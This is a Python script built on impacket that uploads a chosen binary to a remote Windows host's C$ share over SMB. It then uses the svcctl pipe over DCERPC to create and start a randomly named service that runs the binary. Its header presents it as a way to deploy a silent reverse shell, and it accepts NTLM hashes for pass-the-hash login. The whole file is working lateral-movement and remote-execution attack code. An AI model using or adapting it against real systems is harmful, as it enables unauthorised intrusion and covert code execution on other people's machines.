#!/usr/bin/env python3
#
# NO_NAME_FOR_THE_MOMENT
#
# V 1.0
#
# Copyright (C) 2022 Les tutos de Processus. All rights reserved.
#
#
# Description:
#   This tool permits to upload a local binary through SMB on a remote host.
#   Then it remotely connects to svcctl named pipe through DCERPC to create
#   and start the binary as a service.
#   A silent reverse shell can be deployed in that way.
#
# Author:
#   Processus (@ProcessusT)
#

import sys
import argparse
import logging
import traceback
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, scmr
from impacket.uuid import uuidtup_to_bin
import random
import string



class RPC_DROP_AND_LAUNCH():
    def run(self, username, password, domain, lmhash, nthash, target, payload):
        try:
            # generate a random name for our payload
            letters = string.ascii_lowercase
            randName = ''.join(random.choice(letters) for i in range(8))
            randName = randName+".exe"
            # upload payload on c$ remote share
            print("Uploading file " + str(payload))
            smbClient = SMBConnection(target, target)
            smbClient.login(username, password, domain, lmhash, nthash)
            if smbClient.connectTree("c$") != 1:
                raise
            f = open(payload, "rb")
            smbClient.putFile("C$", "\\" + randName, f.read)
            print('uploaded.')
            # We prepare a DCERPCStringBinding object that permits to define transport type (TCP, HTTP, Named pipe...etc)
            rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\svcctl]' % target)
            # We add our creds for the named pipe connection
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)
            # We instanciate a DCERPCTransport object for transport
            # This function returns a DCERPC_v5 object with our custom options
            dce = rpctransport.get_dce_rpc()
            # We connect to our named pipe
            logging.info("Connecting to %s" % r'ncacn_np:%s[\pipe\svcctl]' % target)
            dce.connect()
            # We connect to the UUID or the RPC named pipe to call its functions
            print("connecting to UUID " + str(scmr.MSRPC_UUID_SCMR))
            dce.bind(scmr.MSRPC_UUID_SCMR)
            print("connected !")
            # We open service manager through our connection and retrieve a handle on it
            resp = scmr.hROpenSCManagerW(dce)
            scHandle = resp['lpScHandle']
            # We generate a new random string to create our service
            letters = string.ascii_lowercase
            lpServiceName = ''.join(random.choice(letters) for i in range(8))
            print("Creating service " + lpServiceName)
            lpBinaryPathName="C:\\"+randName
            # We create a service on remote host to launch our payload
            resp = scmr.hRCreateServiceW(dce, scHandle, lpServiceName, lpServiceName, lpBinaryPathName=lpBinaryPathName, dwStartType=scmr.SERVICE_DEMAND_START)
            service = resp['lpServiceHandle']
            # We start the service
            print("Starting service " + lpServiceName)
            scmr.hRStartServiceW(dce, service)
            # Everything is fine, just disconnect now :)
            dce.disconnect()
        except Exception as e:
            print(e)
            sys.exit()


   





def init_logger(args):
    logging.getLogger().setLevel(logging.INFO)
    logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)


def main():
    parser = argparse.ArgumentParser(add_help=True, description="Upload and start your custom payloads remotely !")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('payload', action='store', help='Your custom binary file')
    parser.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    options = parser.parse_args()

    init_logger(options)

    domain, username, password, remoteName = parse_target(options.target)

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    c = RPC_DROP_AND_LAUNCH()
    dce = c.run(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, target=remoteName, payload=options.payload)
    sys.exit()

if __name__ == '__main__':
    main()